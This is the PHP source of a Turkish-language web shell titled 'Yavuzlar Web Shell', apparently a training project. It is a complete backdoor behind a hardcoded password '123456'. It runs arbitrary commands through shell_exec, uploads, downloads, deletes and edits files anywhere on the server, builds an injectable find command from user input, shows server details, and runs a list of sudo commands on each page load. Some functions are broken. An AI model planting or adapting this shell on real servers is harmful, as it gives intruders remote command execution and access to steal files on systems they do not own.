<?php
$password = "123456"; 
session_start();


if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        showLoginForm();
        exit;
    }
}



function executeCommand($cmd) {
    if (function_exists('shell_exec')) {
        if ($cmd === 'help') {
            $output = "Kullanılabilir bazı komutlar:\n";
           
            $output .= "cat [dosya_adı] - Dosya içeriğini görüntüler\n";
           
            $output .= "ls - Dosyaları ve klasörleri listeler\n";
            $output .= "pwd - Şu anki çalışma dizinini görüntüler\n";
            
            $output .= "date - Şu anki tarih ve saat hakkında bilgi verir\n";
            $output .= "whoami - Sistemde kim olduğunuzu görüntüler\n";
            $output .= "uname - Sistem bilgilerini görüntüler\n";
      
            return $output;
        } 
        else {
            $output = shell_exec($cmd . ' 2>&1');
        }
        return $output;
    }
    return "shell_exec fonksiyonu kullanılabilir değil.";
}

if (isset($_POST['ajax']) && isset($_POST['cmd'])) {
    echo executeCommand($_POST['cmd']);
    exit;
}



$action = $_GET['action'] ?? 'main';

switch ($action) {
    case 'execute':
        CommandExecute();
        break;
    case 'upload':
        FileUpload();
        break;
    case 'download':
        FileDownload();
        break;
    case 'delete':
        FileDelete();
        break;
    case 'edit':
        FileEdit ();
        break;
    case 'search':
        FileSearch();
        break;
    case 'info':
        showServerInfo();
        break;
    default:
        showMainPage();
        break;
}




function showLoginForm() {
    echo '<!DOCTYPE html>
    <html lang="tr"> 
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Giriş</title>
    </head>
    <body>
        <form method="POST">
            Şifre: <input type="password" name="password">
            <input type="submit" value="Giriş">
        </form>
    </body>
    </html>';
}


function showMainPage() {
    echo '<!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Yavuzlar Web Shell</title>
       <style>
 body {
    background-color: #282c34; 
    color: #ffffff;
    font-family: Tahoma, Geneva, Verdana, sans-serif; 
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh; 
    margin: 0; 
    padding: 20px;
}

h2 {
    color: #FFD700;
    text-align: center;
}

pre {
    text-align: left; 
    white-space: pre-wrap; 
    word-wrap: break-word; 
    background-color: #1e1e1e; 
    padding: 10px; 
    border-radius: 5px; 
    max-width: 80%; 
    margin: 10px auto; /* Ortala */
}

form {
    margin: 20px 0; 
    text-align: center;
    background-color: #333; 
    padding: 20px; 
    border-radius: 10px; 
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); 
}

input[type="text"],
input[type="file"],
input[type="submit"] {
    margin: 10px 0; 
    padding: 12px; 
    border: 1px solid #4a4a4a; 
    border-radius: 5px; 
    background-color: #404040; 
    color: #ffffff; 
}

input[type="submit"] {
    background-color: #FFD700; 
    color: #000; 
    cursor: pointer; 
    transition: background-color 0.3s; 
}

input[type="submit"]:hover {
    background-color: #FFC107; 
}

.output {
    width: 80%; 
    margin: 20px auto;
    background-color: #1e1e1e; 
    color: #ffffff; 
    padding: 10px; 
    border-radius: 5px; 
    
}

a {
    color: #FFD700; 
    text-decoration: none; 
}

a:hover {
    text-decoration: underline; 
}


 
</style>
    
    </head>
    <body>';

showBanner();
showCommandForm();
showFileUpload();
FileUpload();
showFileManager();
filesearchPage();
serverinfoPage();
FindConfigFile();


echo '</body></html>';
  
}



















//Functions Start














function showBanner() {
    echo "<pre>
 __________
< Yavuzlar Web Shell >
 ---------- 
    \\ 
     \\ 
       #[/[#:xxxxxx:#[/[\\x 
  [/\\ &3N            W3& \\/[x 
[[x@W                      W@x[[\\ 
/#&N                             N_# 
/#@                                  @#/x 
[/ NH_  ^@W               Nd_  ^@p      N /# 
[[d@#_ zz@[/x3           3x:d9zz \\/#_N     d[[ 
/[3^[JMMMJ/////&         ^#NMMMMM ////#W     H[[ 
[/@p/NMMMML@#[:^/3       d/JMMMMMMEx[# x\\      &/# 
//N   xxxxxxxxxxxxN       Wxxxxxxxxxxxxxx_       W// 
/[                                                // 
//N   p333333333333333333333333333333333p        W// 
[/d   _^/#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/H       @/[ 
//#     \\#                              [x       :/ 
[/@    d/x                             #:      &/# 
[[H    ^[x                            [      H[[ 
[[d    _[x            &Hppp3d_      #\\N    @[[ 
[/ N   d#\\        &NzDDDDDDDDJp^ x[xN   N /# 
/#&   N [:     pDDDDDDDDDDDDJ&#:H    &#/ 
/:#_W  W^##x 3DDDDDDDDDJN&:\\^p   W_#/ 
[[x&W  p& xx ^^^^ x:x @W   W&x/[ 
[/# &HW   WWWWN    WH& #/[ 
[/[#\\xxxxxx\\#[/[\\x^@ 
</pre>";
}


















function showCommandForm() {
    echo "<h2>Command Execute</h2>";
    echo '<form id="commandForm" method="POST">
          Command: <input type="text" id="cmd" name="cmd">
          <input type="button" value="Execute" onclick="sendCommand()">
          </form>';
    echo '<div class="output" id="output">RESULTS.</div>';

    // JavaScript (AJAX için)  //YARDIM ALINDI   !!!
    echo '<script>
    function sendCommand() {
        var cmd = document.getElementById("cmd").value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "", true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                document.getElementById("output").innerHTML = "<pre>" + xhr.responseText + "</pre>";
            }
        };
        xhr.send("ajax=1&cmd=" + encodeURIComponent(cmd));
    }
    </script>';
}





















function showFileUpload() {
    echo "<h2>Dosya Yükle:</h2>";
    echo '<form method="POST" enctype="multipart/form-data">
          <input type="file" name="fileToUpload">
          <input type="submit" value="Yükle" name="submit">
          </form>';
}








function FileUpload() {
    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] == UPLOAD_ERR_OK) {
        $target_file = basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "Dosya başarıyla yüklendi: " . htmlspecialchars($target_file);
        } else {
            echo "Dosya yükleme hatası.";
        }
    }
}















function showFileManager() {
    $dir_path = $_GET["directory"] ?? getcwd();
    $dir_path = realpath($dir_path);

    echo '<h2>Dosya Yöneticisi</h2>';
    echo '<pre>Şu anki dizin: ' . ($dir_path) . '</pre>';
    echo '<ul>';

    $files = scandir($dir_path);
    foreach ($files as $file) {
        $path = $dir_path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            echo '<li><a href="?directory=' . ($path) . '">' . ($file) . '</a></li>';
        } else {
            echo '<li>' . ($file) . ' - <a href="?action=delete&file=' . ($path) . '">Sil</a> | <a href="?action=download&file=' . ($path) . '">İndir</a> | <a href="?action=edit&file=' . ($path) . '">Düzenle</a></li>';
        }
    }

    echo '</ul>';
}

































function FileDownload() {
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            readfile($file);
            exit;
        } else {
            echo "Dosya bulunamadı";
        }
    }
    showMainPage();
}























function FileDelete() {
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        if (file_exists($file)) {
            unlink($file);
            echo'<script>alert("Dosya silindi")</script>';
        } else {
            echo "Dosya bulunamadı";
        }
    }
    showMainPage();
}












function FileEdit() { //YA_RDIM ALINDI !!!
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        if (file_exists($file)) {
            $content = file_get_contents($file);
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                file_put_contents($file, $_POST['file_content']);
                echo "Dosya başarıyla kaydedildi";
            }
            echo '<h2>Dosya Düzenleme</h2>';
            echo '<form method="POST">';
            echo '<textarea name="file_content" rows="20" cols="80">' . ($content) . '</textarea><br>';
            echo '<input type="submit" value="Kaydet">';
            echo '</form>';
        } else {
            echo "Dosya bulunamadı";
        }
    }
    showMainPage();
}




function filesearchPage() {
    
    echo '<h2>Dosya Arama</h2>';

    
    echo '<form method="POST" action="?page=filesearch">';
    echo '<label for="searchDirectory">Arama Yapılacak Dizin:</label>';
    echo '<input type="text" name="searchDirectory" id="searchDirectory" value="' . ($_POST['searchDirectory'] ?? $_SERVER["DOCUMENT_ROOT"]) . '" required>';
    echo '<br><label for="searchQuery">Aranacak Dosya Adı:</label>';
    echo '<input type="text" name="searchQuery" id="searchQuery" value="' . ($_POST['searchQuery'] ?? '') . '" required>';
    echo '<br><button class="btn" type="submit">Ara</button>';
    echo '</form>';

    
    if (isset($_POST['searchDirectory']) && isset($_POST['searchQuery'])) {
        $searchDirectory = $_POST['searchDirectory'];
        $searchQuery = $_POST['searchQuery'];

        
        $command = "find \"$searchDirectory\" -type f -name \"*$searchQuery*\""; //YARDIM ALINDI   !!!

        
        $output = shell_exec($command . ' 2>&1');

       
        if (!empty($output)) {
            echo '<h3>Arama Sonuçları</h3>';
            echo '<pre>' . $output . '</pre>';
        } else {
            echo '<p>Arama sonuçları bulunamadı.</p>';
        }
    }
}


function serverinfoPage() {

    $serverInfo = [
        'Sistem Bilgileri' => php_uname(),
        'Sunucu Yazılımı' => $_SERVER['SERVER_SOFTWARE'],
        'Sunucu İsmi' => $_SERVER['SERVER_NAME'],
        'Sunucu Protokolü' => $_SERVER['SERVER_PROTOCOL'],
        'Belge Kök Dizini' => $_SERVER['DOCUMENT_ROOT'],
        'Güncel Zaman' => date('Y-m-d H:i:s'),
        'PHP Sürümü' => phpversion(),
        'Yüklenmiş PHP Eklentileri' => implode(', ', get_loaded_extensions()),
        'Sunucu IP' => $_SERVER['SERVER_ADDR'],
       
    ];

    echo '<h2>Sunucu Bilgileri</h2>';
    echo '<table border="1" cellpadding="5" cellspacing="0">';
    foreach ($serverInfo as $key => $value) {
        echo '<tr>';
        echo '<td><strong>' . $key . '</strong></td>';
        echo '<td>' . $value . '</td>';
        echo '</tr>';
    }
    echo '</table>';
}






function downloadPage() {
    if (file_exists($filePath)) {
       
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . ($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . ($filePath));
        readfile($filePath);
        exit;
    } else {
        echo "Dosya bulunamadı";
    }
}





function FindConfigFile() {
    // Komutların listesi
    // https://www.tecmint.com/check-configuration-files-linux/
    //YARDIM ALINDI
    $commands = [
        "# visudo -c /etc/sudoers" => "sudo visudo -c /etc/sudoers",
        "# visudo -c /etc/sudoers.d/my_config" => "sudo visudo -c /etc/sudoers.d/my_config",
        "# visudo -f /etc/sudoers.d/my_config" => "sudo visudo -f /etc/sudoers.d/my_config",
        "# bash -n /path/to/scriptname.sh" => "bash -n /path/to/scriptname.sh",
        "# perl -c /path/to/scriptname" => "perl -c /path/to/scriptname",
        "# systemd-analyze verify /etc/systemd/system/test.service" => "systemd-analyze verify /etc/systemd/system/test.service",
        "# sshd -t" => "sudo sshd -t",
        "# nginx -t" => "sudo nginx -t",
        "# nginx -t -c /etc/nginx/conf.d/example.com.conf" => "sudo nginx -t -c /etc/nginx/conf.d/example.com.conf",
        "# php-fpm -t" => "sudo php-fpm -t",
        "# apachectl configtest" => "sudo apachectl configtest",
        "# httpd -t" => "sudo httpd -t",
        "# apache2ctl -t" => "sudo apache2ctl -t",
        "# haproxy -f /etc/haproxy/haproxy.cfg -c" => "sudo haproxy -f /etc/haproxy/haproxy.cfg -c",
        "# lighttpd -t" => "sudo lighttpd -t",
        "# lighttpd -t -f /path/to/config/file" => "sudo lighttpd -t -f /path/to/config/file",
        "# ./bin/catalina.sh configtest" => "./bin/catalina.sh configtest",
        "# $TOMCAT_HOME/bin/catalina.sh configtest" => "$TOMCAT_HOME/bin/catalina.sh configtest",
        "# pound -c" => "sudo pound -c",
        "# pound -f /path/to/config/file -c" => "sudo pound -f /path/to/config/file -c",
        "# varnishd -C" => "sudo varnishd -C",
        "# varnishd -f /etc/varnish/default.vcl -C" => "sudo varnishd -f /etc/varnish/default.vcl -C",
        "# squid -k parse" => "sudo squid -k parse",
        "# squid -k debug" => "sudo squid -k debug",
        "# vsftpd" => "sudo vsftpd",
        "# vsftpd -olisten=NO /path/to/vsftpd.testing.conf" => "sudo vsftpd -olisten=NO /path/to/vsftpd.testing.conf",
        "# dhcpd -t" => "sudo dhcpd -t",
        "# dhcpd -t -cf /path/to/dhcpd.conf" => "sudo dhcpd -t -cf /path/to/dhcpd.conf",
        "# mysqld --validate-config" => "sudo mysqld --validate-config",
        "# nagios -v /usr/local/nagios/etc/nagios.cfg" => "sudo nagios -v /usr/local/nagios/etc/nagios.cfg"
    ];

    echo '<h2>Config Dosyası Tespiti</h2>';
    foreach ($commands as $description => $command) {
        echo '<h3>' . $description . '</h3>';
        echo '<pre>';
        echo shell_exec($command . ' 2>&1');
        echo '</pre>';
    }
}

//Functions End
?>

